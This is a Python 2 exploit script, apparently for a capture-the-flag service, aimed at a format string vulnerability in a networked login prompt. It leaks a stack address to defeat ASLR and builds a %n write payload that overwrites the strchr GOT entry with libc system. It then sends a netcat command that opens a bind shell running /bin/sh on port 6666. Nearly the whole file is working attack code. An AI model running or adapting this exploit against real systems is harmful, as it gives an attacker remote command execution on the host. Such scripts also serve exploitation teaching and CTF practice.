#!/usr/bin/python
import socket
from time import sleep
import re
from struct import pack
import sys

# =========================================================================
# formatstring vuln pattern generator
# =========================================================================
def address_to_bytes(bytestowrite, correctby):
	tb = '%08X' % (bytestowrite)
	ba = bytearray(tb.decode('hex')[::-1])
	result = list()
	
	for i in range(len(ba)):
		ba[i] -= correctby

	for i in range(len(ba)):
		if not i:
			result.append(0x100 + ba[i] - 16)
		else:
			result.append(0x100 + ba[i] - ba[i - 1])

	return result

def generate_formatstr_exploit(writetoaddress, bytestowrite, slot, correctby=0, padlen=0):
	tbp = address_to_bytes(bytestowrite, correctby)
	addrstr = ''
	writestr = ''
	for i in range(len(tbp)):
		addrstr  += pack('<L', writetoaddress + i)
		writestr += '%{0}x%{1}$n'.format(
			str(tbp[i]),
			str(slot + i)
			)

	return addrstr + writestr + ''.join(('.') for i in range(padlen))

# =========================================================================
# 
# =========================================================================
def exploit(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	
	# username
	s.recv(1024)	
	s.send('%223$x'+'\n') # using the format string vuln to leak a binary address of the stack
	
	# password
	s.recv(1024)
	s.send('\n')
	
	# email
	s.recv(1024)
	s.send('\n')

	# message
	resp = s.recv(1024).strip()
	l = re.findall(r"'(.*?)'", resp)
	
	# calculate the current baseaddress
	binbase = int(l[0], 16) - 0x00000584

	# calculate the got entry address of
	# strchr from the binary base and the offset
	got_plt_strchr = binbase + 0x00003bc8

	# calculate the address to libc system from the
	# strchr entry(not the cleanest way)
	__libc_system = (got_plt_strchr + 0xffe8ff58) & 0xffffffff

	print "baseaddress: %s got_plt_strchr: %s __libc_system: %s" % (hex(binbase), hex(got_plt_strchr), hex(__libc_system))

	# send yes to continue and stay in the same process
	# and so the alsr doesnt re-base
	s.recv(1024)
	s.send('yes\n')

	# overwrite the got strchr entry to point to
	# libc system
	fs_payload = generate_formatstr_exploit(got_plt_strchr, __libc_system, 522, correctby=len("So your username is '"))

	# username
	s.recv(1024)
	s.send(fs_payload+'\n')

	# password
	s.recv(1024)
	s.send('\n')

	#email
	s.recv(1024)
	s.send('\n')

	# picked up by the last fgets call within get_string
	# and used as first argument in the strchr(now system) call
	s.recv(1024)
	s.send('/bin/nc.traditional -lvp 6666 -e /bin/sh\x00\n')

	s.close()

exploit(sys.argv[1], int(sys.argv[2]))
